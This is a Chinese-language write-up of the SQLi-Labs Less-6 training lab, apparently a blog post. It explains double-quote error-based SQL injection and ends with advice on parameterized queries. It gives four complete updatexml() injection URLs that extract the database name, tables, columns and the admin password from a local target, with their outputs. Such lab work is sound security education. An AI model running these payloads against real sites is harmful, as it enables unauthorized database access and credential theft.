SQLi-Labs Less-6

2026年9月25日 SQLi-Labs Web安全 SQL注入 双引号报错注入

一、题目信息

  • 题目名称：SQLi-Labs Less-6 (GET - Double Injection - Double Quotes - String)
  • 题目平台：SQLi-Labs 本地靶场
  • 题目类型：Web安全 / SQL注入 / 报错注入（双引号闭合）
  • 靶场链接：http://localhost:8081/Less-6/（本地环境）
  • 涉及工具：Chrome浏览器

二、解题步骤

1. 分析题目考什么

本题的核心考点是双引号闭合的报错注入（Error-Based Injection）。与 Less-5 一样，Less-6 页面没有回显查询结果，但服务器会输出报错信息。不同之处在于，Less-6 的后端 SQL 使用双引号包裹变量（WHERE id = "$id"）。攻击者需要用 " 闭合，并利用 updatexml() 函数在报错信息中夹带数据。

2. 怎么想（破题思路）

  • 访问页面，尝试 ?id=1' 报错，说明存在注入点，但闭合方式可能不对。
  • 尝试 ?id=1" --+，页面正常回显 "You are in..."，确认是双引号闭合。
  • 尝试 ?id=-1" union select 1,2,3 --+，页面无数据回显，无法使用联合注入。
  • 利用 updatexml(1, concat(0x7e, (子查询), 0x7e), 1) 触发报错，回显数据库信息。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：惯性使用单引号闭合

踩坑情况：在 Less-6 中继续使用 ?id=1' 报错，无法注入。

原因分析：Less-6 的后端代码包裹符号是双引号 "，单引号会破坏 SQL 语法。

改进方式：把 Payload 里的单引号全部替换成双引号，变成 ?id=1" --+，再配合 updatexml。

踩坑记录二：爆出密码却以为是报错

踩坑情况：使用 Payload 查密码时，页面报错 XPATH syntax error: '~admin~'，没有看到 MD5 字符串。

原因分析：SQLi-Labs 的 security 数据库里，密码是明文存储的，而不是哈希值。`admin` 既是用户名，也是密码。

改进方式：正确识别报错信息中的波浪号内容即可，这就是最终的密码。

详细实操步骤（逐字解析）

第一步：爆出数据库名和版本

?id=1" and updatexml(1,concat(0x7e,database(),0x7e),1) --+

逐字解析：" 闭合双引号，and 连接条件，updatexml 是报错注入函数，concat 拼接波浪号。--+ 注释剩余代码。页面报错显示 ~security~。

第二步：爆出表名

?id=1" and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+

逐字解析：使用子查询查表名，group_concat 将结果合并为一行，报错回显 emails,referers,uagents,users。

第三步：爆出字段名

?id=1" and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1) --+

逐字解析：查询 users 表的列名，回显 id,username,password。

第四步：爆出账号密码

?id=1" and updatexml(1,concat(0x7e,(select password from users where username='admin' limit 0,1),0x7e),1) --+

逐字解析：因 updatexml 报错只有 32 字符限制，直接查全表会被截断。需配合 where 和 limit 查单个用户密码。回显 ~admin~，即密码为 admin。

4. 怎么迁移（跨领域联想）

  • API 接口错误处理：如果 API 返回详细的错误堆栈（Stack Trace），相当于为攻击者提供了报错注入的温床。生产环境应关闭详细错误回显。
  • WAF 绕过：编码与进制转换是 WAF 绕过的常见手法。报错注入中的 0x7e 就是使用了十六进制编码。
  • 安全开发（SDL）：无论 SQL 语句是单引号、双引号还是括号包裹，字符串拼接始终是万恶之源，必须使用参数化查询（Prepared Statement）。

三、名词大全与原理深度复盘

1. 报错注入（Error-Based Injection）

利用数据库报错函数（如 updatexml 或 extractvalue），故意构造错误格式，让报错信息中夹带子查询结果，从而绕过“无回显”限制的技术。

2. updatexml() 函数

MySQL 的 XML 更新函数。第二参数必须是合法的 XPath 格式，如果是 ~数据~ 这种非法格式，就会报错并回显该内容。

3. concat() 与 0x7e

concat 用于拼接字符串。0x7e 是波浪号 ~ 的十六进制表示，既作为非法 XPath 字符触发报错，又方便在回显中一眼定位数据。

4. 32 字符限制

MySQL 的 updatexml() 函数在报错回显时，最多只能输出 32 个字符。因此查询长数据时，需要配合 substr() 分段截取，或使用 where 限定条件单条查询。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 Less-5 的区别：Less-5 是单引号闭合，Less-6 是双引号闭合。
  • 与 Less-1 ~ Less-4 的区别：前几关页面有数据回显，直接联合查询；Less-6 无数据回显，靠报错信息泄露数据。

2. 这种题目的出现原因

开发者直接拼接了用户输入到 SQL 语句中，且开启了 PHP 的 display_errors 选项，将数据库的报错信息直接输出到了前端。

3. 这种应用在实际中如何体现？

在真实渗透中，遇到无回显但报错的注入点，攻击者会优先使用报错注入快速爆库。如果报错被 WAF 拦截，则会转向布尔盲注或时间盲注。

4. 如何抽象理解概念（大白话理解）

把数据库比作一个“口无遮拦的图书管理员”：

  • 联合注入：管理员直接把书给你。
  • 报错注入：管理员不给你书，但你故意在借书单上写错格式，管理员生气地大喊：“你写的‘员工名单’格式不对！”你就能听到你要的信息。
  • 双引号报错：这次借书单的格式要求是用双引号写的，你用单引号会被直接拒收。

做一道题，就要往自己脑子里装点东西。
